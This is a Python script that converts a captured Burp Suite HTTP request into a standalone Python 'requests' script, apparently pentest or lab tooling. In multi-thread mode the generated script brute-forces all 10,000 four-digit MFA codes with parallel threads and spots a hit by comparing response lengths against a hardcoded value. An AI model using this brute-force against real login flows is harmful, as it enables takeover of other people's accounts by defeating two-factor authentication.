import datetime
import json
import os
import sys
from urllib.parse import parse_qs


def convert_burp_to_python(raw_request, is_https=True, multi_thread=True, max_workers=20, request_delay=0.2):
    lines = raw_request.strip().split("\n")
    if not lines or lines[0].strip() == "":
        return "Error : No request content !!!"

    first_line = lines[0].strip().split(" ")
    if len(first_line) < 2:
        return "Error：Wrong HTTP(s) format"
    method = first_line[0]
    path = first_line[1]

    headers = {}
    cookies = {}
    body_index = -1

    for i in range(1, len(lines)):
        line = lines[i].strip("\r\n")
        if line == "":
            body_index = i + 1
            break

        if ":" in line:
            key, value = line.split(":", 1)
            key = key.strip()
            value = value.strip()

            if key.lower() == "cookie":
                cookie_pairs = value.split(";")
                for pair in cookie_pairs:
                    if "=" in pair:
                        c_key, c_val = pair.split("=", 1)
                        cookies[c_key.strip()] = c_val.strip()
            else:
                headers[key] = value

    host = headers.get("Host", "localhost")
    protocol = "https://" if is_https else "http://"
    full_url = f"{protocol}{host}{path}"

    body_data = ""
    if body_index != -1 and body_index < len(lines):
        body_data = "\n".join(lines[body_index:])

    output = "#!/usr/bin/python3\n\n"
    if multi_thread:
        output += "from concurrent.futures import ThreadPoolExecutor, as_completed\n"
        output += "import time\n"
        output += "import requests\n"
        output += "import sys\n\n"
    else:
        output += "import requests\n\n"

    output += f'url = "{full_url}"\n\n'
    output += "headers = " + json.dumps(headers, indent=4, ensure_ascii=False) + "\n\n"

    if cookies:
        output += "cookies = " + json.dumps(cookies, indent=4, ensure_ascii=False) + "\n\n"
    else:
        output += "cookies = {}\n\n"

    payload_var = None
    req_call = ""
    if body_data:
        if "application/json" in headers.get("Content-Type", "").lower():
            try:
                json_obj = json.loads(body_data)
                output += "json_data = " + json.dumps(json_obj, indent=4, ensure_ascii=False) + "\n\n"
                payload_var = "json_data"
                req_call = f"requests.{method.lower()}(url, headers=headers, cookies=cookies, json=json_data)"
            except Exception:
                output += f'raw_data = """{body_data}"""\n\n'
                payload_var = "raw_data"
                req_call = f"requests.{method.lower()}(url, headers=headers, cookies=cookies, data=raw_data)"
        else:
            try:
                parsed_body = parse_qs(body_data)
                clean_body = {k: v for k, v in parsed_body.items()}
                if clean_body:
                    output += "data = " + json.dumps(clean_body, indent=4, ensure_ascii=False) + "\n\n"
                    payload_var = "data"
                    req_call = f"requests.{method.lower()}(url, headers=headers, cookies=cookies, data=data)"
                else:
                    raise ValueError("Empty form body")
            except Exception:
                output += f'raw_data = """{body_data}"""\n\n'
                payload_var = "raw_data"
                req_call = f"requests.{method.lower()}(url, headers=headers, cookies=cookies, data=raw_data)"
    else:
        req_call = f"requests.{method.lower()}(url, headers=headers, cookies=cookies)"

    if multi_thread:
        output += "def send_request(identify, delay):\n"
        output += "    if delay > 0:\n"
        output += "        time.sleep(delay)\n"
        if payload_var == "data":
            output += '    payload = {"mfa-code": identify}\n'
            output += f"    response = requests.{method.lower()}(url, headers=headers, cookies=cookies, data=payload)\n"
        elif payload_var == "json_data":
            output += f"    response = requests.{method.lower()}(url, headers=headers, cookies=cookies, json=json_data)\n"
        elif payload_var == "raw_data":
            output += f"    response = requests.{method.lower()}(url, headers=headers, cookies=cookies, data=raw_data)\n"
        else:
            output += f"    response = requests.{method.lower()}(url, headers=headers, cookies=cookies)\n"
        output += "    return identify, response\n\n\n"

        output += 'if __name__ == "__main__":\n'
        output += "    futures = []\n"
        output += "    checked = 0\n"
        output += f"    max_workers = {max_workers}\n"
        output += f"    request_delay = {request_delay}\n\n"

        if payload_var == "data":
            output += f"    response = requests.{method.lower()}(url, headers=headers, cookies=cookies, data=data)\n"
        elif payload_var == "json_data":
            output += f"    response = requests.{method.lower()}(url, headers=headers, cookies=cookies, json=json_data)\n"
        elif payload_var == "raw_data":
            output += f"    response = requests.{method.lower()}(url, headers=headers, cookies=cookies, data=raw_data)\n"
        else:
            output += f"    response = requests.{method.lower()}(url, headers=headers, cookies=cookies)\n"

        output += '    print(f"response length : {len(response.text)}")\n'
        output += "    sys.exit(0)\n\n"
        output += "    with ThreadPoolExecutor(max_workers=max_workers) as executor:\n"
        output += "        for i in range(10000):\n"
        output += '            futures.append(executor.submit(send_request, f"{i:04d}", delay=request_delay))\n\n'
        output += "        for future in as_completed(futures):\n"
        output += "            identify, response = future.result()\n"
        output += "            checked += 1\n"
        output += '            print(f"\\r[+] testing mfa code ({checked}/10000) ... ", end="", flush=True)\n\n'
        output += "            if len(response.text) != 3184:\n"
        output += '                print(f"\\nmfa code: {identify}, {len(response.text)}")\n'
        output += "                for pending in futures:\n"
        output += "                    pending.cancel()\n"
        output += "                break\n\n"
        output += "    #print(response.status_code)\n"
        output += "    #print(response.text)\n"
    else:
        output += 'if __name__ == "__main__":\n'
        output += f"    response = {req_call}\n"
        output += "    print(response.status_code)\n"
        output += "    print(response.text)\n"

    return output


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("User Input Error")
        print("Usage: python3 burp_request_to_py.py <burp_request_file_path> [output py path]")
        print("Usage: python3 burp_request_to_py.py ./test_burp_request ~/abc_page.py")
        sys.exit(1)

    input_file_path = sys.argv[1]

    if not os.path.exists(input_file_path):
        print(f"Error: File path '{input_file_path}' does not exist !!!")
        sys.exit(1)

    with open(input_file_path, "r", encoding="utf-8", errors="ignore") as f:
        burp_request_content = f.read()

    python_code = convert_burp_to_python(burp_request_content, is_https=True)

    if len(sys.argv) >= 3:
        output_file_path = os.path.expanduser(sys.argv[2])
    else:
        time_str = datetime.datetime.now().strftime("%d%m%Y_%H%M%S")
        output_file_path = f"burp_request_{sys.argv[1]}_{time_str}.py"

    try:
        output_dir = os.path.dirname(output_file_path)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)

        with open(output_file_path, "w", encoding="utf-8") as f:
            f.write(python_code)
        print(f"Save as: {output_file_path}")
    except Exception as e:
        print(f"Error: {e}")
